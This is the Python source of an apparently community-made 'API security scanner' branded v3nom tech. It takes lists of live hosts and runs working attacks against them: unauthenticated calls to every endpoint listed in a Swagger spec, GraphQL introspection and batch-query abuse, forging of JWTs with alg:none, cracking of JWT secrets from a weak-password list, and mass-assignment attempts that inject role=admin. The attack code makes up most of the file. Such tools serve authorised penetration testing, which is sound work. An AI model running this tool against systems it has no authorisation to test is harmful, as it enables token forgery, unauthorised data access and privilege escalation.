#!/usr/bin/env python3
# =============================================================================
#
#  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
#  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
#  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
#  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
#   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
#    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
#
#  ████████╗███████╗ ██████╗██╗  ██╗
#  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
#     ██║   █████╗  ██║     ███████║
#     ██║   ██╔══╝  ██║     ██╔══██║
#     ██║   ███████╗╚██████╗██║  ██║
#     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
#
#  [ v3nom tech ]
#  Instagram : @venom.tech.official
#  GitHub    : https://github.com/v3nomtech
#
# =============================================================================
"""
api_tester.py — API Security Scanner
Targets: REST (swagger/openapi), GraphQL, JWT, mass assignment, BOLA

Input: urls_all.txt + exposed_paths.txt from venomeye output
"""

import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urljoin

class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"

def info(m):  print(f"{C.CYAN}[*]{C.RESET} {m}")
def ok(m):    print(f"{C.GREEN}[+]{C.RESET} {m}")
def warn(m):  print(f"{C.YELLOW}[!]{C.RESET} {m}")
def crit(m):  print(f"{C.RED}{C.BOLD}[VULN]{C.RESET} {m}")
def section(m): print(f"\n{C.BOLD}{C.CYAN}{'─'*60}\n  {m}\n{'─'*60}{C.RESET}")

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝

  ████████╗███████╗ ██████╗██╗  ██╗
  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
     ██║   █████╗  ██║     ███████║
     ██║   ██╔══╝  ██║     ██╔══██║
     ██║   ███████╗╚██████╗██║  ██║
     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
{C.RESET}{C.GREEN}  [ v3nom tech ]  |  Instagram: @venom.tech.official  |  GitHub: https://github.com/v3nomtech
{C.RESET}""")

def tool_exists(name): return shutil.which(name) is not None

def curl(url, method="GET", headers=None, data=None, timeout=10) -> tuple[int, dict, str]:
    cmd = ["curl", "-sk", "--max-time", str(timeout),
           "-X", method, "-o", "-", "-D", "-",
           "-A", "Mozilla/5.0", "-L", "--max-redirs", "3"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if data:
        cmd += ["-d", json.dumps(data) if isinstance(data, dict) else data]
        if isinstance(data, dict):
            cmd += ["-H", "Content-Type: application/json"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        raw = r.stdout
        # split headers from body
        if "\r\n\r\n" in raw:
            hdr_block, body = raw.split("\r\n\r\n", 1)
        elif "\n\n" in raw:
            hdr_block, body = raw.split("\n\n", 1)
        else:
            hdr_block, body = raw, ""
        sc_match = re.search(r"HTTP/[\d.]+ (\d+)", hdr_block)
        sc = int(sc_match.group(1)) if sc_match else 0
        hdrs = {}
        for line in hdr_block.splitlines()[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                hdrs[k.strip().lower()] = v.strip()
        return sc, hdrs, body
    except Exception:
        return 0, {}, ""

# ── Swagger/OpenAPI discovery & parse ─────────────────────────────────────────
SWAGGER_PATHS = [
    "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
    "/openapi.json", "/openapi.yaml", "/api-docs",
    "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/swagger-ui.html", "/api/swagger.json",
    "/docs/swagger.json", "/api/openapi.json",
    "/.well-known/openapi.json",
]

def find_api_specs(live_hosts: list[str]) -> list[tuple[str, dict]]:
    """Return list of (url, spec_dict) for all found swagger/openapi specs."""
    found = []
    for host in live_hosts:
        base = host.rstrip("/")
        for path in SWAGGER_PATHS:
            url = base + path
            sc, _, body = curl(url, timeout=8)
            if sc != 200 or not body.strip():
                continue
            try:
                spec = json.loads(body)
                if "paths" in spec or "swagger" in spec or "openapi" in spec:
                    ok(f"API spec found: {url}")
                    found.append((url, spec))
                    break
            except json.JSONDecodeError:
                # could be YAML
                if "paths:" in body or "swagger:" in body:
                    ok(f"API spec (YAML) found: {url}")
                    found.append((url, {"_raw_yaml": body, "_url": url}))
                    break
    return found

def test_unauthenticated_endpoints(spec: dict, base_url: str, cookie: str) -> list[dict]:
    """Test each endpoint in the spec without authentication."""
    findings = []
    paths = spec.get("paths", {})
    servers = spec.get("servers", [{"url": base_url}])
    server_url = servers[0].get("url", base_url) if servers else base_url
    if server_url.startswith("/"):
        server_url = base_url.rstrip("/") + server_url

    headers = {}
    if cookie:
        headers["Cookie"] = cookie

    for path, methods in paths.items():
        for method, details in methods.items():
            if method.upper() not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                continue
            url = server_url.rstrip("/") + path
            # replace path params with test values
            url = re.sub(r"\{[^}]+\}", "1", url)
            sc, resp_headers, body = curl(url, method=method.upper(), headers=headers, timeout=8)
            if sc in (200, 201) and "unauthorized" not in body.lower():
                finding = {
                    "type": "unauth_api_endpoint",
                    "severity": "high",
                    "method": method.upper(),
                    "url": url,
                    "status": sc,
                    "operation": details.get("operationId", ""),
                    "tags": details.get("tags", []),
                    "body_snippet": body[:300],
                }
                findings.append(finding)
                warn(f"UNAUTH {method.upper()} {url} → {sc}")
    return findings

# ── GraphQL ───────────────────────────────────────────────────────────────────
GRAPHQL_PATHS = [
    "/graphql", "/graphiql", "/__graphql", "/api/graphql",
    "/v1/graphql", "/query", "/gql",
]

INTROSPECTION_QUERY = {"query": "{ __schema { queryType { name } types { name kind fields { name } } } }"}

GRAPHQL_ATTACKS = [
    # introspection
    ("introspection", {"query": "{ __schema { types { name } } }"}),
    # batch query DoS hint
    ("batch_query",   [{"query": "{ __typename }"}] * 100),
    # field suggestion (triggers verbose errors)
    ("field_suggest", {"query": "{ usr { id } }"}),
    # SSRF via query
    ("ssrf_query",    {"query": '{ __typename @skip(if: false) }'}),
]

def check_graphql(host: str, cookie: str) -> list[dict]:
    findings = []
    base = host.rstrip("/")
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie

    for path in GRAPHQL_PATHS:
        url = base + path

        # check if endpoint exists
        sc, _, body = curl(url, method="POST", headers=headers,
                           data=INTROSPECTION_QUERY, timeout=8)
        if sc not in (200, 400, 500) or not body:
            continue

        # introspection enabled?
        if "__schema" in body or '"data"' in body:
            finding = {
                "type": "graphql_introspection",
                "severity": "medium",
                "url": url,
                "body_snippet": body[:400],
            }
            findings.append(finding)
            warn(f"GraphQL introspection enabled: {url}")

            # try to dump schema types
            if '"types"' in body:
                try:
                    data = json.loads(body)
                    types = data.get("data", {}).get("__schema", {}).get("types", [])
                    user_types = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
                    finding["schema_types"] = user_types[:50]
                    info(f"  GraphQL types: {', '.join(user_types[:10])}")
                except Exception:
                    pass

        # batch query abuse
        sc2, _, body2 = curl(url, method="POST", headers=headers,
                             data=[{"query": "{ __typename }"}] * 50, timeout=10)
        if sc2 == 200 and '"data"' in body2:
            findings.append({
                "type": "graphql_batch_enabled",
                "severity": "medium",
                "url": url,
                "note": "Batch queries accepted — potential DoS / info leak",
            })
            warn(f"GraphQL batch queries enabled: {url}")

        if findings:
            break

    return findings

# ── JWT attacks ───────────────────────────────────────────────────────────────
WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "qwerty", "letmein",
    "changeme", "admin", "default", "key", "jwt",
    "mysecret", "your-256-bit-secret", "your-secret-key",
    "", "null", "undefined", "test", "development",
]

def decode_jwt(token: str) -> tuple[dict, dict]:
    parts = token.split(".")
    if len(parts) != 3:
        return {}, {}
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        return header, payload
    except Exception:
        return {}, {}

def forge_none_alg(token: str) -> str:
    """Forge a JWT with alg:none."""
    parts = token.split(".")
    if len(parts) != 3:
        return ""
    header = {"alg": "none", "typ": "JWT"}
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    return f"{new_header}.{parts[1]}."

def crack_jwt_secret(token: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = base64.urlsafe_b64decode(parts[2] + "==")
    for secret in WEAK_JWT_SECRETS:
        try:
            expected = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if hmac.compare_digest(expected, sig):
                return secret
        except Exception:
            continue
    return None

def test_jwt(token: str, url: str, header_name: str = "Authorization") -> list[dict]:
    findings = []
    header, payload = decode_jwt(token)
    if not header:
        return findings

    info(f"JWT found: alg={header.get('alg')} sub={payload.get('sub','?')} exp={payload.get('exp','?')}")

    # none algorithm attack
    if header.get("alg", "").upper() != "NONE":
        forged = forge_none_alg(token)
        if forged:
            h = {header_name: f"Bearer {forged}"}
            sc, _, body = curl(url, headers=h, timeout=8)
            if sc == 200 and "unauthorized" not in body.lower():
                findings.append({
                    "type": "jwt_none_alg",
                    "severity": "critical",
                    "url": url,
                    "forged_token": forged[:80],
                    "status": sc,
                })
                crit(f"JWT none-alg accepted! {url}")

    # weak secret
    secret = crack_jwt_secret(token)
    if secret is not None:
        findings.append({
            "type": "jwt_weak_secret",
            "severity": "critical",
            "url": url,
            "secret": secret,
            "payload": payload,
        })
        crit(f"JWT weak secret '{secret}' cracked! {url}")

    return findings

# ── Mass Assignment ───────────────────────────────────────────────────────────
MASS_ASSIGN_FIELDS = [
    "role", "admin", "isAdmin", "is_admin", "privilege", "permissions",
    "group", "level", "verified", "active", "approved", "balance",
    "credits", "plan", "subscription", "superuser", "staff",
]

def test_mass_assignment(url: str, method: str, cookie: str) -> list[dict]:
    """POST/PUT extra privileged fields and check if server reflects them."""
    findings = []
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie

    for field in MASS_ASSIGN_FIELDS:
        payload = {field: True, f"{field}_id": 1, "role": "admin"}
        sc, _, body = curl(url, method=method, headers=headers, data=payload, timeout=8)
        if sc in (200, 201):
            # check if any field was reflected in response
            for f in MASS_ASSIGN_FIELDS:
                if f'"admin"' in body or '"superuser"' in body or '"role"' in body:
                    findings.append({
                        "type": "mass_assignment",
                        "severity": "high",
                        "url": url,
                        "field": field,
                        "response_snippet": body[:300],
                    })
                    warn(f"Possible mass assignment: {field} @ {url}")
                    return findings  # one hit per URL
    return findings

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    banner()
    parser = argparse.ArgumentParser(description="API Security Tester")
    parser.add_argument("-u", "--urls",       default="", help="urls_all.txt from venomeye")
    parser.add_argument("-l", "--live-hosts", default="", help="live_hosts.txt from venomeye")
    parser.add_argument("-o", "--output",     default="./api_results", help="Output directory")
    parser.add_argument("--cookie",           default="", help="Session cookie for auth context")
    parser.add_argument("--jwt",              default="", help="JWT token to test (for JWT attacks)")
    parser.add_argument("--jwt-url",          default="", help="URL to test JWT against")
    parser.add_argument("-t", "--threads",    type=int, default=15)
    parser.add_argument("--skip-graphql",     action="store_true")
    parser.add_argument("--skip-swagger",     action="store_true")
    parser.add_argument("--skip-jwt",         action="store_true")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)
    section("API Security Tester")

    live_hosts = []
    if args.live_hosts:
        try:
            live_hosts = [l.strip() for l in open(args.live_hosts) if l.strip()]
            info(f"Loaded {len(live_hosts)} live hosts")
        except FileNotFoundError:
            warn(f"live_hosts file not found: {args.live_hosts}")

    all_findings: list[dict] = []

    # ── Swagger/OpenAPI ───────────────────────────────────────────────────
    if not args.skip_swagger and live_hosts:
        section("Swagger/OpenAPI Discovery")
        specs = find_api_specs(live_hosts)
        info(f"Found {len(specs)} API specifications")
        for spec_url, spec in specs:
            base = "/".join(spec_url.split("/")[:3])
            results = test_unauthenticated_endpoints(spec, base, args.cookie)
            all_findings.extend(results)
            if results:
                ok(f"{len(results)} unauthenticated endpoints at {base}")

    # ── GraphQL ───────────────────────────────────────────────────────────
    if not args.skip_graphql and live_hosts:
        section("GraphQL Detection & Testing")
        info(f"Testing {len(live_hosts)} hosts for GraphQL endpoints...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(check_graphql, h, args.cookie): h for h in live_hosts}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    results = fut.result()
                    all_findings.extend(results)
                except Exception:
                    pass

    # ── JWT attacks ───────────────────────────────────────────────────────
    if not args.skip_jwt:
        if args.jwt and args.jwt_url:
            section("JWT Attack Testing")
            results = test_jwt(args.jwt, args.jwt_url)
            all_findings.extend(results)
        elif args.urls:
            # extract JWTs from URLs / params automatically
            section("JWT Extraction from URLs")
            jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
            found_jwts = set()
            try:
                for line in open(args.urls):
                    for m in jwt_re.finditer(line):
                        found_jwts.add(m.group(0))
            except FileNotFoundError:
                pass
            if found_jwts:
                info(f"Found {len(found_jwts)} JWTs in URLs")
                for token in found_jwts:
                    if live_hosts:
                        results = test_jwt(token, live_hosts[0])
                        all_findings.extend(results)
            else:
                info("No JWTs found in URLs")

    # ── write outputs ─────────────────────────────────────────────────────
    json_out = f"{args.output}/findings.json"
    with open(json_out, "w") as f:
        json.dump(all_findings, f, indent=2)

    report_out = f"{args.output}/report.txt"
    with open(report_out, "w") as f:
        f.write(f"API Security Report — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        by_type: dict[str, list] = {}
        for item in all_findings:
            by_type.setdefault(item.get("type", "unknown"), []).append(item)
        for vtype, items in sorted(by_type.items()):
            f.write(f"\n[{vtype.upper()}] — {len(items)} findings\n{'─'*40}\n")
            for item in items:
                for k, v in item.items():
                    if k != "type":
                        f.write(f"  {k}: {str(v)[:200]}\n")
                f.write("\n")

    section("Summary")
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    by_sev: dict[str, list] = {}
    for item in all_findings:
        by_sev.setdefault(item.get("severity", "info"), []).append(item)
    for sev in sorted(by_sev, key=lambda x: severity_order.get(x, 9)):
        ok(f"{sev.upper():<12} : {C.BOLD}{len(by_sev[sev])}{C.RESET}")
    ok(f"Report : {report_out}")
    ok(f"JSON   : {json_out}")

if __name__ == "__main__":
    main()
